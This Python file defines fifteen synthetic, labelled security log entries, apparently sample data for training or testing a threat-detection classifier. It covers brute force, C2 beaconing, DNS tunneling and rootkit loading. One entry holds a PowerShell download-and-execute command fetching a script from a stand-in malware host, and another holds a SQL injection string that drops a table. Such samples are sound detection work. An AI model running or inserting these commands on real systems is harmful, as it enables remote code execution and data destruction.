from typing import List, Dict

# NOVA Phase 1: 15 Realistic Multi-Vector Cybersecurity Logs
SAMPLE_LOGS = [
    {"id": 1, "raw": "2026-04-13 22:01:45 [AUTH] FAILED login for user 'admin' from 192.168.1.5 - Reason: Invalid password", "label": "Brute Force Attempt"},
    {"id": 2, "raw": "2026-04-13 22:05:12 [AUTH] FAILED login for user 'admin' from 192.168.1.5 - Reason: Invalid password", "label": "Brute Force Attempt"},
    {"id": 3, "raw": "2026-04-13 22:08:33 [AUTH] FAILED login for user 'admin' from 192.168.1.5 - Reason: Invalid password", "label": "Brute Force Attempt"},
    {"id": 4, "raw": "2026-04-13 22:10:01 [SYSLOG] Outbound connection to 45.33.22.11 on port 4444 from internal 10.0.0.45", "label": "Potential C2 Beaconing"},
    {"id": 5, "raw": "2026-04-13 22:15:20 [APP] user: 'jdoe' accessed folder '/secret/financials/' - Action: READ", "label": "Normal Operation"},
    {"id": 6, "raw": "2026-04-13 22:20:05 [APP] user: 'jdoe' downloaded 500 files from '/secret/financials/' - Action: DOWNLOAD", "label": "Insider Threat / Data Exfiltration"},
    {"id": 7, "raw": "2026-04-13 22:25:30 [WAF] SQL Injection detected in 'search' query: 'SELECT * FROM users WHERE id=1; DROP TABLE users;' from 185.23.44.110", "label": "SQL Injection"},
    {"id": 8, "raw": "2026-04-13 22:30:12 [PS] process: 'powershell.exe' executed command: 'IEX(New-Object Net.WebClient).DownloadString(\"http://malware.evil/shell.ps1\")' by user: 'service_account'", "label": "Remote Code Execution (RCE)"},
    {"id": 9, "raw": "2026-04-13 22:35:45 [SMTP] Email sent to 500 recipients from 'noreply@yourcompany.com' with attachment 'invoice.zip.exe' from internal IP 10.0.0.101", "label": "Phishing / Malware Spread"},
    {"id": 10, "raw": "2026-04-13 22:40:02 [IDS] Suricata Alert: ET EXPLOIT possible CVE-2026-9999 heap overflow from 92.45.1.20 to 10.0.0.5", "label": "Exploitation Attempt"},
    {"id": 11, "raw": "2026-04-13 22:45:15 [AUTH] SUCCESS login for user 'admin' from 192.168.1.5 after 30 failed attempts", "label": "Account Takeover (Credential Stuffing)"},
    {"id": 12, "raw": "2026-04-13 22:50:30 [DNS] High volume of DNS TXT queries to 'tunnel.badactor.com' from 10.0.0.5", "label": "DNS Tunneling / Data Exfil"},
    {"id": 13, "raw": "2026-04-13 22:55:01 [APP] user: 'mstone' changed password for 15 other accounts in 2 minutes", "label": "Privilege Escalation / Admin Abuse"},
    {"id": 14, "raw": "2026-04-13 23:00:45 [EDR] suspicious driver 'kernel_rootkit.sys' loaded by process: 'svchost.exe'", "label": "Rootkit Installation"},
    {"id": 15, "raw": "2026-04-13 23:05:12 [FIREWALL] Blocked port scanning activity from 77.88.99.100 on multiple common ports", "label": "Reconnaissance / Port Scanning"}
]

def load_sample_dataset() -> List[Dict]:
    """Returns the set of 15 sample cyber logs."""
    return SAMPLE_LOGS
